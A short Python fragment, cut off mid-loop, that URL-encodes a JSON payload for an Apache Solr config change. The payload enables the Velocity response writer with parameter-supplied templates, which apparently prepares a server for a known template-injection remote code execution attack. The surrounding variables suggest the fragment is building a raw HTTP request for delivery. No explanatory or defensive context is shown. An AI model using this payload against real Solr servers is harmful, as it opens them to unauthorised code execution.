import urllib.parse
quoter = lambda quote: urllib.parse.quote(quote)
""" PASS DATA BELOW """

data = """{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}"""

""" PASS DATA ABOVE """
quoted = quoter(data)
index = 0
urlencode_index = 0
content_length = 0
for character in quoted:
